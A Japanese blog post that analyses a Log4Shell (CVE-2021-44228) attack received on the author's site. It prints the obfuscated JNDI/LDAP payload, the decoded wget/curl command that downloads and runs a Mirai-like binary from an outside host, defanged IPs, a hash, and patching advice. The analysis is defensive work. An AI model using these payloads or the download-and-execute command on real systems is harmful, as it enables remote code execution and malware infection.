# log4shellの攻撃コードを見てみる  

私のブログサイトにlog4shellの攻撃コードが送られてきた。こんんなできたばかりの貧相なサイトにも送ってくれる網羅性には感心する。  
なので、ここではその攻撃コードをみんなで見て勉強していきたいと思う。  

## 早速見てみる

まぁ、いきなり見てしまうのが一番なので以下に見てみる。  
```
"t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150[.]136[.]111[.]68[:]1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8xNTguMTAxLjExOC4yMzYvc3NoZF9wdHk7IGN1cmwgLU8gaHR0cDovMTU4LjEwMS4xMTguMjM2L3NzaGRfcHR5OyBjaG1vZCA3Nzcgc3NoZF9wdHk7IC4vc3NoZF9wdHkgZXhwbG9pdA==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150[.]136[.]111[.]68[:]1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8xNTguMTAxLjExOC4yMzYvc3NoZF9wdHk7IGN1cmwgLU8gaHR0cDovMTU4LjEwMS4xMTguMjM2L3NzaGRfcHR5OyBjaG1vZCA3Nzcgc3NoZF9wdHk7IC4vc3NoZF9wdHkgZXhwbG9pdA==}')"
```
Note: IPとポートの箇所はマスクした。  
で、攻撃コードにはコマンドがbase64で記載されているため、これをデコードしてみよう。  
```
wget hxxp:/158[.]101[.]118[.]236/sshd_pty;
curl -O hxxp:/158[.]101[.]118[.]236/sshd_pty;
chmod 777 sshd_pty;
[.]/sshd_pty
```
Note: URLはマスクを実施。本来はワンライナーになっていたが、見やすいように改行した。  

まぁ、わかりやすい。sshd_ptyというファイルをダウンロードして実行。  
ちなみにこのsshd_ptyはバイナリ形式であり、fileコマンドで見ると以下のようになっていた。  
```
# file sshd_pty
sshd_pty: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, stripped
```
sha256: 3e30a65e6504969c05b1bed32db2a2a592da110a7d2dbda9f064f13be5390d6c

VirusTotalに上げて見ると、32/59の検知。大半はMiraiで検知していた。  
[VirusTotalの結果](https://www.virustotal.com/gui/file/3e30a65e6504969c05b1bed32db2a2a592da110a7d2dbda9f064f13be5390d6c)

この攻撃コードを送ってくれたのと、コード内にある通信先は以下となる。  
* 送信元: 198[.]98[.]61[.]124
* 送信先: 150[.]136[.]111[.]68

最後に攻撃コードの内容がいくつか難読化（というか検知回避レベル）のトリックがなされているため、若干見やすくしたのが以下となる。  
```
"t('${jndi:ldap://150[.]136[.]111[.]68[:]1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8xNTguMTAxLjExOC4yMzYvc3NoZF9wdHk7IGN1cmwgLU8gaHR0cDovMTU4LjEwMS4xMTguMjM2L3NzaGRfcHR5OyBjaG1vZCA3Nzcgc3NoZF9wdHk7IC4vc3NoZF9wdHkgZXhwbG9pdA==}')" "t('${jndi:ldap://150[.]136[.]111[.]68[:]1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8xNTguMTAxLjExOC4yMzYvc3NoZF9wdHk7IGN1cmwgLU8gaHR0cDovMTU4LjEwMS4xMTguMjM2L3NzaGRfcHR5OyBjaG1vZCA3Nzcgc3NoZF9wdHk7IC4vc3NoZF9wdHkgZXhwbG9pdA==}')"
```

こうやって見ると、jndi:ldap://〜URL〜であり、明らかにlog4shellを狙っている。  

さて、いきなり攻撃コードを出したが、ここからはlog4shellがなんなのかを説明していく。  

## log4jの脆弱性(通称：log4shell)  

log4shellは、javaで一般的に利用されるlogging用のフレームワークであるlog4jで検出された脆弱性である。  
**CVE番号: CVE-2021-44228**  

脆弱性はRCEにあたり、任意コード実行が可能となる。脆弱性が悪用しているものは、log4jがLDAPとJNDIのリクエストの内容に関して検証が行えてないことを悪用している。  
以下にあるようにWikipediaにも専用のページが作成されている。  
[log4shellに関する記述](https://ja.wikipedia.org/wiki/Log4Shell)

この脆弱性を利用した場合、jndi:ldap://の後ろにつけられたURLからコードを取得して実行することができる。  

## 対策   

この脆弱性は最新版では修正されているため、アップグレードすることを推奨する。  
この脆弱性自体は、2.15で修正されたが、その他の脆弱性も見つかっているため、2.17にアップグレードすることが推奨される。  

## 所感  

正直、驚きのレベルの脆弱性である。このレベルの脆弱性はshellshock以来のように思う。  
（HeartBleedもあったが、これはRCEではないので、同じ系統で考えると、shellshockが思い浮かぶ）  
まして、log4jはjavaで開発をすると、とりあえずこれにしとけ、てレベルのライブラリであり、これでこんな深刻な脆弱性があるとは想像もしてなかった。  
放置しているサーバもあるだろうし、今後もこの脆弱性は利用されていくだろう。  
参考: [ShellShock](https://ja.wikipedia.org/wiki/2014%E5%B9%B4%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%B7%E3%83%A7%E3%83%83%E3%82%AF%E8%84%86%E5%BC%B1%E6%80%A7)

さて、これでこの記事は一旦終了である。  
この後、この攻撃サーバへの通信を停止することを行う。それについては、Azureの環境のため、Azureセキュリティグループで防止する方法を見ていこう。  

では、終了となります。ありがとうございました。  
Note: 今回送りつけられたマルウェアは、githubで置いてあります。(パス付きZIPになってますので、悪しからず)  
